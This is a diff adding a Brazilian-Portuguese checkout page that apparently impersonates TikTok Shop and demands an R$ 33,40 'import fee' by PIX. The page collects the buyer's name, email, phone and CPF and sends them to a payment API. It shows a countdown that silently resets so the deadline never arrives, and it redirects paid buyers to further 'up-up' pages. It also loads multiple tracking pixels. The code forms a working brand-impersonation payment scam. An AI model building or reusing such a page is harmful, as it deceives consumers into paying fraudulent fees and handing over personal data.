@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <script src="/js/pix-netlify.js"></script>
+<!-- Microsoft Clarity Code Start -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yevctx4wrr");
+</script>
+<!-- Microsoft Clarity Code End -->
+
+  <!-- TikTok Pixel Code Start -->
+  <script>
+    !function (w, d, t) {
+      w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+        for (
+          var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+      }, ttq.load = function (e, n) {
+        var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+          ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+      };
+      ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+  <!-- TikTok Pixel Code End -->
+  <!-- Spotify Pixel Code Start -->
+  <script>
+    (function (w, d) {
+      var id = 'spdt-capture', n = 'script';
+      if (!d.getElementById(id)) {
+        w.spdt = w.spdt || function () { (w.spdt.q = w.spdt.q || []).push(arguments); };
+        var e = d.createElement(n); e.id = id; e.async = 1;
+        e.src = 'https://pixel.byspotify.com/ping.min.js';
+        var s = d.getElementsByTagName(n)[0]; s.parentNode.insertBefore(e, s);
+      }
+      w.spdt('conf', { key: 'b2d850e2d437439d8f7ed7f0a10968f0' });
+      w.spdt('view');
+    })(window, document);
+  </script>
+  <!-- Spotify Pixel Code End -->
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+  <title>Taxa de Importação - TikTok Shop</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    body {
+      background: #f7f9fa;
+    }
+
+    .pix-container {
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      width: 100%;
+      max-width: 480px;
+      margin: 0 auto;
+      position: relative;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    .pix-header {
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      border-bottom: 1px solid #eee;
+      background: #fff;
+    }
+
+    .pix-header-back {
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      display: flex;
+      align-items: center;
+    }
+
+    .pix-header-title {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #111;
+      margin-right: 24px;
+    }
+
+    .pix-content {
+      flex: 1;
+      padding: 20px 16px;
+    }
+
+    .pix-status-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .pix-status-left {
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+
+    .pix-status-title {
+      font-size: 19px;
+      font-weight: 800;
+      color: #111;
+    }
+
+    .pix-status-price {
+      font-size: 21px;
+      font-weight: 800;
+      color: #111;
+      margin-top: 2px;
+    }
+
+    .pix-status-expire {
+      font-size: 13px;
+      color: #666;
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      margin-top: 6px;
+    }
+
+    .pix-expire-badge {
+      background: #ff2c55;
+      color: #fff;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      gap: 3px;
+    }
+
+    .pix-status-date {
+      font-size: 12px;
+      color: #888;
+      margin-top: 2px;
+    }
+
+    .pix-status-icon-orange {
+      width: 44px;
+      height: 44px;
+      background: #ffa726;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 24px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .pix-code-box {
+      background: #fff;
+      border: 1px solid #ebebeb;
+      border-radius: 12px;
+      padding: 18px 16px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.03);
+      margin-bottom: 16px;
+    }
+
+    .pix-brand-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .pix-logo-img {
+      height: 22px;
+      object-fit: contain;
+    }
+
+    .pix-brand-name {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .pix-textarea {
+      width: 100%;
+      font-size: 16px;
+      color: #111;
+      font-weight: 700;
+      border: none;
+      resize: none;
+      outline: none;
+      background: transparent;
+      padding: 0;
+      margin-bottom: 16px;
+      line-height: 1.4;
+      font-family: inherit;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .pix-copy-btn {
+      width: 100%;
+      background: #ff2c55;
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s ease;
+    }
+
+    .pix-copy-btn:hover {
+      background: #e0244b;
+    }
+
+    .pix-copy-btn.copied-success {
+      background: #00b159 !important;
+    }
+
+    .pix-instructions-note {
+      font-size: 12px;
+      color: #666;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    .pix-instructions-section {
+      margin-top: 20px;
+    }
+
+    .pix-instructions-title {
+      font-size: 17px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 12px;
+    }
+
+    .pix-instructions-desc {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+    }
+
+    .pix-footer {
+      position: sticky;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      padding: 12px 16px 24px 16px;
+      background: #fff;
+      border-top: 1px solid #eee;
+      box-sizing: border-box;
+      z-index: 10;
+    }
+
+    .pix-btn-ver-pedido {
+      width: 100%;
+      background: #f5f5f5;
+      color: #222;
+      border: none;
+      border-radius: 8px;
+      padding: 13px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: background 0.2s;
+    }
+
+    .pix-btn-ver-pedido:hover {
+      background: #e8e8e8;
+    }
+
+    .pedido-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 100%;
+      max-width: 480px;
+      height: 100vh;
+      background: #f7f9fa;
+      z-index: 99999;
+      overflow-y: auto;
+      flex-direction: column;
+    }
+
+    .pedido-modal-header {
+      background: #fff;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #eee;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .pedido-modal-title {
+      flex: 1;
+      text-align: center;
+      font-size: 16px;
+      font-weight: 700;
+      color: #111;
+      margin-right: 24px;
+    }
+
+    .pedido-modal-content {
+      padding: 16px;
+      flex: 1;
+    }
+
+    .pedido-card {
+      background: #fff;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 12px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+    }
+
+    .pedido-store-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 12px;
+    }
+
+    .pedido-item-row {
+      display: flex;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .pedido-item-img {
+      width: 64px;
+      height: 64px;
+      border-radius: 8px;
+      object-fit: contain;
+      transform: scale(0.85);
+      border: 1px solid #f0f0f0;
+    }
+
+    .pedido-item-details {
+      flex: 1;
+    }
+
+    .pedido-item-name {
+      font-size: 13px;
+      color: #222;
+      font-weight: 500;
+      line-height: 1.4;
+    }
+
+    .pedido-item-var {
+      font-size: 11px;
+      color: #888;
+      margin-top: 4px;
+    }
+
+    .pedido-item-price-qty {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 8px;
+    }
+
+    .pedido-item-price {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111;
+    }
+
+    .pedido-item-qty {
+      font-size: 12px;
+      color: #666;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="pix-container">
+
+    <!-- HEADER -->
+    <header class="pix-header">
+      <!-- TikTok Pixel Code Start -->
+      <script>
+        !function (w, d, t) {
+          w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+            for (
+              var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+          }, ttq.load = function (e, n) {
+            var r = "https://analytics.tiktok.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+              ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+          };
+          ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+          ttq.page();
+        }(window, document, 'ttq');
+      </script>
+      <!-- TikTok Pixel Code End -->
+      <button class="pix-header-back" onclick="history.back()">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#222" stroke-width="2.5">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <div class="pix-header-title">Taxa de Importação</div>
+    </header>
+
+    <!-- CONTEUDO PRINCIPAL -->
+    <div class="pix-content">
+
+      <!-- Status do pedido -->
+      <div class="pix-status-box">
+        <div class="pix-status-left">
+          <div class="pix-status-title">Aguardando o pagamento</div>
+          <div class="pix-status-price">R$ 33,40</div>
+          <div class="pix-status-expire">
+            <span>Vence em</span>
+            <div class="pix-expire-badge">
+              <svg viewBox="0 0 24 24" width="12" height="12" fill="none" stroke="#fff" stroke-width="3"
+                style="margin-top: 1px;">
+                <circle cx="12" cy="12" r="10" />
+                <polyline points="12 6 12 12 16 14" />
+              </svg>
+              <span id="pix-countdown">23:59:59</span>
+            </div>
+          </div>
+          <div class="pix-status-date" id="pix-deadline-date"></div>
+        </div>
+        <div class="pix-status-icon-orange">
+          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="#fff" stroke-width="2.5">
+            <circle cx="12" cy="12" r="10" />
+            <polyline points="12 6 12 12 16 14" />
+          </svg>
+        </div>
+      </div>
+
+      <!-- Bloco Copia e Cola -->
+      <div class="pix-code-box">
+        <div class="pix-brand-row">
+          <img class="pix-logo-img" src="../logopix/image.png" onerror="this.style.display='none'" alt="Pix">
+          <span class="pix-brand-name">PIX</span>
+        </div>
+        <input type="text" class="pix-textarea" id="pix-code-text" readonly value="Aguardando geração do código PIX...">
+        <button class="pix-copy-btn" onclick="copyPixCode()">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+          </svg>
+          Copiar
+        </button>
+      </div>
+
+      <!-- Nota -->
+      <div class="pix-instructions-note">
+        Copie o código Pix acima e pague pelo aplicativo do seu banco em <strong>Pix &gt; Pix Copia e Cola</strong>.
+      </div>
+
+      <!-- Como pagar -->
+      <div class="pix-instructions-section">
+        <div class="pix-instructions-title">Como pagar a taxa?</div>
+        <div class="pix-instructions-desc">
+          1. Copie o código de pagamento acima.<br>
+          2. Abre o app do seu banco e selecione <strong>Pix</strong>.<br>
+          3. Escolha <strong>Pix Copia e Cola</strong> e cole o código.<br>
+          4. Confirme o pagamento de <strong>R$ 33,40</strong>.<br><br>
+          Após a confirmação, seu pedido será liberado automaticamente.
+        </div>
+      </div>
+
+    </div>
+
+    <!-- FOOTER FIXADO -->
+    <footer class="pix-footer">
+      <button class="pix-btn-ver-pedido" onclick="openPedidoModal()">Ver pedido</button>
+    </footer>
+
+  </div>
+
+  <!-- MODAL DE LISTA DE PRODUTOS -->
+  <div class="pedido-modal" id="pedido-modal-box">
+    <div class="pedido-modal-header">
+      <button class="pix-header-back" onclick="closePedidoModal()">
+        <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="#222" stroke-width="2.5">
+          <polyline points="15 18 9 12 15 6"></polyline>
+        </svg>
+      </button>
+      <div class="pedido-modal-title">Detalhes do Pedido</div>
+    </div>
+    <div class="pedido-modal-content">
+      <div class="pedido-card">
+        <div class="pedido-store-name">TikTok Shop</div>
+        <div id="pedido-items-list"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Recupera ou gera PIX da taxa de importação
+    var pixCodeImport = localStorage.getItem('importacao_pix_code') || '';
+    var pixTxidImport = localStorage.getItem('importacao_txid') || '';
+
+    var codeEl = document.getElementById('pix-code-text');
+    if (codeEl && pixCodeImport) {
+      codeEl.value = pixCodeImport;
+    }
+
+    // Se não tem PIX salvo no sessionStorage, gera automaticamente como fallback
+    if (!pixCodeImport) {
+      gerarPixImportacao();
+    }
+
+    async function gerarPixImportacao() {
+      try {
+        var nome = localStorage.getItem('user_nome') || 'Cliente';
+        var email = localStorage.getItem('user_email') || 'cliente@email.com';
+        var tel = localStorage.getItem('user_tel') || '';
+        var cpf = localStorage.getItem('user_cpf') || '';
+
+        var resp = await fetch('/api/create-pix', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            amount: 3340, // R$ 33,40 em centavos
+            name: nome,
+            email: email,
+            cellphone: tel.replace(/\D/g, ''),
+            taxId: cpf.replace(/\D/g, ''),
+            src: window.location.href,
+            user_agent: navigator.userAgent
+          })
+        });
+
+        var data = await resp.json();
+        console.log('[ImportacaoPix] Resposta:', data);
+
+        if (data && data.pix_code) {
+          pixCodeImport = data.pix_code;
+          pixTxidImport = data.txid || '';
+
+          localStorage.setItem('importacao_pix_code', pixCodeImport);
+          if (pixTxidImport) localStorage.setItem('importacao_txid', pixTxidImport);
+
+          var el = document.getElementById('pix-code-text');
+          if (el) el.value = pixCodeImport;
+
+          if (pixTxidImport) iniciarPolling(pixTxidImport);
+        } else {
+          console.error('[ImportacaoPix] Sem pix_code na resposta:', data);
+        }
+      } catch (err) {
+        console.error('[ImportacaoPix] Erro ao gerar PIX:', err);
+      }
+    }
+
+    // Iniciar polling se já tem txid
+    if (pixTxidImport) {
+      iniciarPolling(pixTxidImport);
+    }
+
+    function formatarMoeda(valor) {
+      return valor.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    }
+
+    function copyPixCode() {
+      var btn = document.querySelector('.pix-copy-btn');
+      var input = document.getElementById('pix-code-text');
+      var code = input ? input.value : pixCodeImport;
+
+      if (!code || code.includes('Aguardando')) {
+        alert('Código PIX ainda não disponível. Aguarde alguns segundos.');
+        return;
+      }
+
+      var execCopy = function () {
+        if (btn) {
+          var originalHTML = btn.innerHTML;
+          btn.innerHTML = '<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg> Copiado';
+          btn.classList.add('copied-success');
+          setTimeout(function () {
+            btn.innerHTML = originalHTML;
+            btn.classList.remove('copied-success');
+          }, 4000);
+        }
+      };
+
+      if (navigator.clipboard) {
+        navigator.clipboard.writeText(code).then(execCopy).catch(function () {
+          if (input) { input.select(); document.execCommand('copy'); execCopy(); }
+        });
+      } else {
+        if (input) { input.select(); document.execCommand('copy'); execCopy(); }
+      }
+    }
+
+    function startRegressivo() {
+      var time = 24 * 3600 - 1;
+      var countEl = document.getElementById('pix-countdown');
+      setInterval(function () {
+        var h = Math.floor(time / 3600);
+        var m = Math.floor((time % 3600) / 60);
+        var s = time % 60;
+        if (countEl) countEl.textContent =
+          String(h).padStart(2, '0') + ':' +
+          String(m).padStart(2, '0') + ':' +
+          String(s).padStart(2, '0');
+        time--;
+        if (time < 0) time = 24 * 3600 - 1;
+      }, 1000);
+    }
+
+    function setDeadlineDate() {
+      var now = new Date();
+      now.setDate(now.getDate() + 1);
+      var dia = String(now.getDate()).padStart(2, '0');
+      var meses = ['jan', 'fev', 'mar', 'abr', 'mai', 'jun', 'jul', 'ago', 'set', 'out', 'nov', 'dez'];
+      var hora = String(now.getHours()).padStart(2, '0');
+      var min = String(now.getMinutes()).padStart(2, '0');
+      var el = document.getElementById('pix-deadline-date');
+      if (el) el.textContent = hora + ':' + min + ', ' + dia + ' de ' + meses[now.getMonth()] + ' de ' + now.getFullYear();
+    }
+
+    function openPedidoModal() { document.getElementById('pedido-modal-box').style.display = 'flex'; }
+    function closePedidoModal() { document.getElementById('pedido-modal-box').style.display = 'none'; }
+
+    function getCart() {
+      try {
+        const pedidos = JSON.parse(localStorage.getItem('famosinhos_pedidos') || '[]');
+        if (pedidos && pedidos.length > 0 && pedidos[0].itens) {
+          return pedidos[0].itens;
+        }
+        return JSON.parse(localStorage.getItem('famosinhos_cart') || '[]');
+      } catch (e) { return []; }
+    }
+
+    function renderPedidoItems() {
+      var cart = getCart();
+      var listEl = document.getElementById('pedido-items-list');
+      if (!listEl) return;
+      if (!cart.length) {
+        listEl.innerHTML = '<p style="color:#888;font-size:13px;text-align:center;">Nenhum produto no pedido.</p>';
+        return;
+      }
+      var html = '';
+      for (var i = 0; i < cart.length; i++) {
+        var item = cart[i];
+        var qty = item.qty || 1;
+        var price = typeof item.preco === 'number' ? item.preco : parseFloat(String(item.preco).replace(',', '.'));
+        var imgSrc = item.img || '';
+        if (!imgSrc.startsWith('http') && !imgSrc.startsWith('//')) {
+          if (imgSrc.startsWith('../')) imgSrc = imgSrc.substring(3);
+          imgSrc = '../' + imgSrc;
+        } else if (imgSrc.startsWith('//')) {
+          imgSrc = 'https:' + imgSrc;
+        }
+        html += '<div class="pedido-item-row">' +
+          '<img class="pedido-item-img" src="' + imgSrc + '" onerror="this.src=\'https://via.placeholder.com/64\'">' +
+          '<div class="pedido-item-details">' +
+          '<div class="pedido-item-name">' + item.nome + '</div>' +
+          (item.variacao ? '<div class="pedido-item-var">' + item.variacao + '</div>' : '') +
+          '<div class="pedido-item-price-qty">' +
+          '<span class="pedido-item-price">R$ ' + formatarMoeda(price) + '</span>' +
+          '<span class="pedido-item-qty">x' + qty + '</span>' +
+          '</div>' +
+          '</div>' +
+          '</div>';
+      }
+      listEl.innerHTML = html;
+    }
+
+    var _pollingInterval = null;
+    function iniciarPolling(txid) {
+      if (!txid) return;
+      if (_pollingInterval) clearInterval(_pollingInterval);
+      _pollingInterval = setInterval(async function () {
+        try {
+          var resp = await fetch('/api/payment-status/' + txid);
+          var data = await resp.json();
+          console.log('[ImportacaoPix] Status:', data);
+          var pago = data.status === 'paid' || data.status === 'approved' || data.status === 'PAID' || data.status === 'APPROVED' || data.paid === true;
+          if (pago) {
+            clearInterval(_pollingInterval);
+            localStorage.removeItem('importacao_pix_code');
+            localStorage.removeItem('importacao_txid');
+            window.location.href = '/up-up-3';
+          }
+        } catch (err) {
+          console.error('[ImportacaoPix] Erro no polling:', err);
+        }
+      }, 5000);
+    }
+
+    // Inicializações
+    renderPedidoItems();
+    startRegressivo();
+    setDeadlineDate();
+  </script>
+
+</body>
+
+</html>
